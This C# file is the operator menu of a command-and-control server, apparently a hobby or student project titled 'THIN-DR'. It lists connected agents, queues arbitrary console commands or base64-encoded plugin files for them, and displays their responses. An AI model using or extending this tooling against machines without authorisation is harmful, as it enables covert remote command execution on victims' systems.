using System;
using System.Collections.Generic;
using Spectre.Console;
using System.Threading.Tasks;

namespace server{
    public class UserInput{
        //Main class for C2 Operator input
        public Listener listener {get; set;}

        public UserInput(Listener listener){
            //pass our listener into this object
            this.listener = listener;
            Console.WriteLine(@"
_________         _________ _               ______   _______ 
\__   __/|\     /|\__   __/( (    /|       (  __  \ (  ____ )
   ) (   | )   ( |   ) (   |  \  ( |       | (  \  )| (    )|
   | |   | (___) |   | |   |   \ | | _____ | |   ) || (____)|
   | |   |  ___  |   | |   | (\ \) |(_____)| |   | ||     __)
   | |   | (   ) |   | |   | | \   |       | |   ) || (\ (   
   | |   | )   ( |___) (___| )  \  |       | (__/  )| ) \ \__
   )_(   |/     \|\_______/|/    )_)       (______/ |/   \__/
                                                             
            ");
        }

        private string Menu(){
            //returns a menu
            //should be made generic and with input
            //in the constructor *theoretically*

            //the following are modified from Spectre Console docs
            // https://spectreconsole.net/widgets/table
            // https://spectreconsole.net/prompts/selection
            // Create a table
            var menuOptions = new Table();

            // Add some columns
            menuOptions.AddColumn("#");
            menuOptions.AddColumn(new TableColumn("Command"));

            // Add some rows
            menuOptions.AddRow("1","[red]Exit[/]");
            menuOptions.AddRow("2","[blue]List all Clients[/]");
            menuOptions.AddRow("3", "[fuchsia]List Available Plugins[/]");
            menuOptions.AddRow("4","[green]Command[/]");
            menuOptions.AddRow("5","[purple]View Responses[/]");

            // Render the tables to the console
            AnsiConsole.Write(menuOptions);
            // added a prompt for the menu
            var prompt = AnsiConsole.Prompt(
                new SelectionPrompt<string>()
                    .Title("What would you like to do?")
                    .PageSize(10)
                    .AddChoices(new[] {
                        "Exit", "List Clients", "List Available Plugins", "Command", "View Responses"
                }));
            return prompt;
        }

        public void MenuInput(){
            //User input for the server
            //Menu Backend
            bool menuLoop = true;
            while(menuLoop){
                string input = Menu();
                switch(input){
                    case "Exit":
                        //exiting our loop here will terminate the server
                        menuLoop = false;
                        break;
                    case "List Clients":
                        var clients = new Table();
                        clients.AddColumn("Registered Clients");
                        foreach(var agent in ListClients()){
                            clients.AddRow(agent);
                        }
                        AnsiConsole.Write(clients);
                        break;
                    case "Command":
                        SetCommand();
                        break;
                    case "View Responses":
                        var comT = new Table();
                        ViewResponses();
                        break;
                    case "List Available Plugins":
                        var plugins = new Table();
                        plugins.AddColumn("Installed Plugins");
                        foreach(var plugin in ListPlugins()){
                            plugins.AddRow(plugin);
                        }
                        AnsiConsole.Write(plugins);
                        break;
                    default: 
                        Console.WriteLine("\nInvalid input; Please try again.");
                        break;
                }
            }
        }
        private string[] ListClients(){
            //Converts client list to a string array
            //List<Agent> agents = this.listener.agents;
            //var enum = this.listener.agents.GetEnumerator();
            var agents = this.listener.agents;
            string[] agentArr = new string[agents.Count];
            int count = 0;
            foreach (var agent in agents){
                agentArr[count] = agent.Key;
                count++;
            }
            return agentArr;
        }

        private string[] ListPlugins(){
            //shows all plugins in the plugin folder
            var plugins = this.listener.pluginDict;
            string[] pluginArr = new string[plugins.Count];
            int count = 0;
            foreach(var plugin in plugins){
                pluginArr[count] = plugin.Key;
                count++;
            }
            return pluginArr;
        }

        public int SetCommand(){
            //set a command for a client to query
            var firstprompt = AnsiConsole.Prompt(
                new SelectionPrompt<string>()
                    .Title("Would you like to run a console command or a command from a plugin?")
                    .PageSize(10)
                    .AddChoices(new[] {"Console Command","Plugin"})
            );
            var prompt = AnsiConsole.Prompt(
                new SelectionPrompt<string>()
                    .Title("Select the client you would like to send a command to")
                    .PageSize(10)
                    .AddChoices(ListClients())
            );

            if(firstprompt == "Console Command"){
                if(this.listener.agents.TryGetValue(prompt, out Agent agent)){
                    var command = AnsiConsole.Ask<string>("Enter the console [red]command to run:[/] ");
                    string[] c_command = {command, "console"};
                    agent.commandQue.AddLast(c_command);
                    Console.WriteLine("\n");
                    return 0;
                }
                //error if agent is not found for one reason or another
                return 1;
            } else {
                var thirdprompt = AnsiConsole.Prompt(
                    new SelectionPrompt<string>()
                        .Title("Select the plugin to run:")
                        .PageSize(10)
                        .AddChoices(ListPlugins())
                );
                if(this.listener.agents.TryGetValue(prompt, out Agent agent)){
                    //add plugin to command que
                    //should add the specific function to be run by the plugin
                    //but that's for later
                    agent.commandQue.AddLast(new string[]{this.listener.Base64EncodeFile(thirdprompt), "plugin"});
                    Console.WriteLine("\n");
                    return 0;
                } else {
                    return 1;
                }
                //this.listener.TransferPlugin(thirdprompt);
            }
        }

        /*
        TODO
        * modify console command menu option to have a sub menu for console command or plugin commnad
        * add function to run a "SendFile" like method
        * in the SendFile like method that is run (in the Listener class), have it base64 encode the plugin and send that to the client
        * Client needs to be prepared for that
        */
        

        public List<string> ViewResponses(){
            //return responses sent by each client
            var prompt = AnsiConsole.Prompt(
                new SelectionPrompt<string>()
                    .Title("Select the client you'd like to see responses from")
                    .PageSize(10)
                    .AddChoices(ListClients())
            );
            if(this.listener.agents.TryGetValue(prompt, out Agent agent)){
                AnsiConsole.Markup($"Responses from [red]{agent.name}[/]:\n");
                foreach(var com in agent.commandResp){
                    Console.WriteLine(com);
                }
                Console.WriteLine("\n");
            }
            //return an empty list if the agent is not found
            return new List<string>();
        }
    }
}